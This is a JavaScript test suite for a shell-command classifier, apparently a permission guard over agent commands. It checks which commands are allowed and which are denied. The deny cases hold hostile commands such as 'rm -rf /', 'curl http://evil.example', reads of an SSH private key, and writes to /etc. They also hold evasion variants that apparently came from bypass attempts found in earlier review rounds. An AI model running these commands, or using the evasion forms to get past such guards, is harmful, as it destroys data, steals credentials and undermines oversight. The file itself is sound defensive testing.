import { classifyBashCommand } from './lib/classifier.js'

const cases = [
  // ── Y1: wash-out PoCs must DENY (real single-quotes, real regex literals) ──
  [`node --input-type=module -e "'//'; import {writeFileSync as w} from 'node:fs'; w('/etc/guardtest/x','a')"`, false],
  [`node -e "const s='//'; require('fs').writeFileSync('/etc/guardtest/x','a')"`, false],
  [`node --input-type=module -e "'//'; import {execSync as e} from 'node:child_process'; e('id')"`, false],
  [`node --input-type=module -e "const s='a//b'; import {rmSync as r} from 'node:fs'; r('/etc/guardtest/x')"`, false],
  [`node -e "const re=/\\/\\//; require('fs').writeFileSync('/etc/guardtest/x','a')"`, false],
  [`node --input-type=module -e "const DOC='https://host/docs#x'; import {writeFileSync as w} from 'node:fs'; w('/etc/guardtest/x','a')"`, false],
  [`node -e "const c='#'; require('fs').writeFileSync('/etc/guardtest/x','a')"`, false],
  // ── Y1 legal forms stay ALLOW ──
  [`node -e "const s='http://x'; console.log(s)"`, true],
  [`node -e "const a=5//2; console.log(a)"`, true],
  [`node -e "const re=/a\\/\\/b/; console.log(re)"`, true],
  [`node -e "const c='#fff'; console.log(c)"`, true],
  [`node -e "x=1 // real comment with writeFileSync('/x')\nconsole.log(x)"`, true],
  [`python3 -c "s='a#b'; print(s)"`, true],
  [`python3 -c "x=1  # Path('/etc/x').write_text('a')\nprint(x)"`, true],
  [`python3 -c "# open('/etc/x','w')\nprint('hi')"`, true],
  [`python3 -c "print('#')"`, true],
  // ── Y2: commented os.system/urlopen allow; real forms deny ──
  [`python3 -c "# os.system('id')\nprint(1)"`, true],
  [`python3 -c "# from urllib.request import urlopen; urlopen('http://x')\nprint(1)"`, true],
  [`python3 -c "import os  # os.system('rm -rf /')\nprint(os.getcwd())"`, true],
  [`python3 -c "import os; os.system('id')"`, false],
  [`python3 -c "from urllib.request import urlopen; urlopen('http://example.invalid')"`, false],
  // ── Y3: rs+ deny / rs allow; root two-hop; builtins/io alias; call shapes ──
  [`node -e "const fs=require('fs'); fs.openSync('/etc/guardtest/x','rs+')"`, false],
  [`node --input-type=module -e "import {open as o} from 'node:fs'; o('/etc/guardtest/x','rs+',(e,fd)=>{})"`, false],
  [`node --input-type=module -e "import {open as o} from 'node:fs'; o('/etc/hosts','rs',(e,fd)=>{})"`, true],
  [`node -e "const fs=require('fs'); fs.openSync('/etc/hosts','rs')"`, true],
  [`node -e "const g=globalThis; const h=g; h.fetch('http://example.invalid/x')"`, false],
  [`node -e "const g=globalThis; const h=g; const [f]=[h.fetch]; f('http://example.invalid/x')"`, false],
  [`node -e "const g=globalThis; const h=g; console.log(h.process.env.PATH)"`, true],
  [`python3 -c "import io as ii; ii.open('/etc/guardtest/x','w').write('a')"`, false],
  [`python3 -c "import builtins as b; b.open('/etc/guardtest/x','w')"`, false],
  [`python3 -c "import io as ii; ii.open('/etc/hosts').read()"`, true],
  [`node --input-type=module -e "import {writeFileSync as w} from 'node:fs'; (w)('/etc/guardtest/x','a')"`, false],
  [`node --input-type=module -e "import {writeFileSync as w} from 'node:fs'; [w][0]('/etc/guardtest/x','a')"`, false],
  [`node --input-type=module -e "import {execSync as e} from 'node:child_process'; e\`id\`"`, false],
  // ── regressions (X1/X2/K1-K3) ──
  [`node -e "const f=require('fs'); f.readFileSync('/etc/hosts','utf8')"`, true],
  [`node --input-type=module -e "import f from 'node:fs/promises'; f.readFile('/etc/hosts','utf8')"`, true],
  [`node --input-type=module -e "import {readFile} from 'node:fs/promises'; readFile('/etc/hosts','utf8')"`, true],
  [`node --input-type=module -e "import {open as o} from 'node:fs'; o('/etc/hosts','r',(e,fd)=>{})"`, true],
  [`node -e "const f=require('fs'); f.writeFileSync('/etc/guardtest/x','a')"`, false],
  [`node -e "const f=require('fs'); f.openSync('/etc/guardtest/x','w')"`, false],
  [`node --input-type=module -e "import {writeFileSync as w} from 'node:fs'; const w2=w; w2('/etc/guardtest/x','a')"`, false],
  [`python3 -c "from os import system as s; s2=s; s2('id')"`, false],
  [`node -e "const fs=require('fs'); fs.createWriteStream('/etc/guardtest/x')"`, false],
  [`node -e "const fs=require('fs'); fs.openSync('/etc/hosts','r')"`, true],
  [`node -e "Store().writeFileSync('/x','a')"`, true],
  [`python3 -c "f=open('/etc/guardtest/x','w'); f.write('a')"`, false],
  [`python3 -c "import urllib.request as u; u.urlopen('http://example.invalid/x')"`, false],
  [`node -e "const {fetch:f}=globalThis; const hh=f; hh('http://example.invalid/x')"`, false],
  [`node -e "const {promises:{readdir}}=require('fs'); readdir('.')"`, true],
  [`git status`, true],
  [`node -e "require('fs').writeFileSync('/etc/guardtest/x','a')"`, false],
  [`node -e "const re=/\\/\\//; require('fs').writeFileSync('/etc/guardtest/x','a')"`, false],
  // ── round-9 blockers: from-import open-as + no-space python comments ──
  [`python3 -c "from io import open as op; op('/etc/guardtest/x','w').write('a')"`, false],
  [`python3 -c "from builtins import open as op; op('/etc/guardtest/x','w')"`, false],
  [`python3 -c "from io import open as op; op('/etc/guardtest/x','w').truncate()"`, false],
  [`python3 -c "from io import open as op; o2=op; o2('/etc/guardtest/x','w').write('a')"`, false],
  [`python3 -c "from io import open as op; op('/etc/hosts').read()"`, true],
  [`python3 -c "x=1#os.system('id')\nprint(x)"`, true],
  [`python3 -c "1#os.system('id')\nprint(1)"`, true],
  [`python3 -c "import os; x=1#os.system('id')\nos.getcwd()"`, true],
  [`python3 -c "import os; os.system('id')#trailing\nprint(1)"`, false],
  [`node -e "class A { #x = 1; #w(){} }; console.log(1)"`, true],
  [`node -e "const fs=require('fs'); fs.openSync('/etc/guardtest/x','rs+')#x\nconsole.log(1)"`, false],
  // ── round-10: versioned/pypy interpreters ──
  [`python3.12 -c "print(1)"`, true],
  [`/usr/bin/python3.12 -c "print(1)"`, true],
  [`python312 -c "print(1)"`, true],
  [`pypy3 -c "print(1)"`, true],
  [`pypy3.10 -c "print(1)"`, true],
  [`python3.12 -c "x=1#os.system('id')\nprint(x)"`, true],
  [`python3.12 -c "import os; os.system('id')"`, false],
  [`python3.12 -c "from io import open as op; op('/etc/guardtest/x','w').write('a')"`, false],
  [`pypy3 -c "import os; os.system('id')"`, false],
  // ── round-11 followup: ABI/build suffixes ──
  [`python3.12m -c "print(1)"`, true],
  [`python3.12t -c "print(1)"`, true],
  [`python3.12d -c "print(1)"`, true],
  [`python3.12-dbg -c "print(1)"`, true],
  [`/usr/bin/python3.12-dbg -c "print(1)"`, true],
  [`pypy3m -c "print(1)"`, true],
  [`python3.12m -c "x=1#os.system('id')\nprint(x)"`, true],
  [`python3.12m -c "import os; os.system('id')"`, false],
  [`python3.12t -c "from io import open as op; op('/etc/guardtest/x','w').write('a')"`, false],
  // 伪造名不得放行
  [`python3.12x -c "print(1)"`, false],
  [`python3.12-config -c "print(1)"`, false],
  [`python3.12m-dbg -c "print(1)"`, false],
  [`pypy3x -c "print(1)"`, false],
  // 敏感路径层：versioned 名也要吃 -c 扫描
  [`python3.12 -c "print(open('/Users/x/.ssh/id_rsa').read())"`, false, ['/Users/x/.ssh']],
  [`python3.12m -c "print(open('/Users/x/.ssh/id_rsa').read())"`, false, ['/Users/x/.ssh']],
  [`pypy3 -c "print(open('/Users/x/.ssh/id_rsa').read())"`, false, ['/Users/x/.ssh']],
  [`python3.12 -c "print(open('/Users/x/notes.txt').read())"`, true, ['/Users/x/.ssh']],
  // ── round-12 followup: uv run interpreter inline-code gap (fail-open) ──
  [`uv run python3 -c "import os; os.system('id')"`, false],
  [`uv run python3 -c "import urllib.request; urllib.request.urlopen('http://evil.example/x')"`, false],
  [`uv run --python 3.12 python3.12 -c "import os; os.system('id')"`, false],
  [`uv run pypy3 -c "import os; os.system('id')"`, false],
  [`uv run python3 -c "x=1#os.system('id')\nprint(x)"`, true],
  [`uv run python3 -c "print(1)"`, true],
  [`uv run script.py`, true],
  [`uv run python3 --version`, true],
  [`uv run python3 script.py`, true],
  [`uv run --python 3.12 python3.12 --version`, true],
  // ── round-13 followup: uv run shell interpreters (same allow-side class) ──
  [`uv run bash -c "curl http://evil.example/x"`, false],
  [`uv run sh -c "rm -rf /"`, false],
  [`uv run zsh -c "curl http://evil.example"`, false],
  [`uv run dash -c "curl http://evil.example"`, false],
  [`uv run bash -c "echo hi"`, true],
  [`uv run bash script.sh`, true],
  [`uv run bash --version`, true],
]

let miss = 0
for (const [c, wantAllow, denyReadPaths] of cases) {
  const v = classifyBashCommand(c, denyReadPaths ?? [])
  // deny = unknown (unverifiable danger) OR forceDeny (sensitive-path block
  // surfaces as category 'read' + forceDeny:true)
  const denied = v.category === 'unknown' || v.forceDeny === true
  const ok = wantAllow ? !denied : denied
  if (!ok) {
    miss++
    console.log(`${wantAllow ? 'ALLOW' : 'DENY'}-MISS ${v.category}${v.forceDeny ? '(forceDeny)' : ''} | ${c.slice(0, 70)}`)
  }
}
console.log(miss === 0 ? `ALL OK (${cases.length})` : `${miss} MISS / ${cases.length}`)
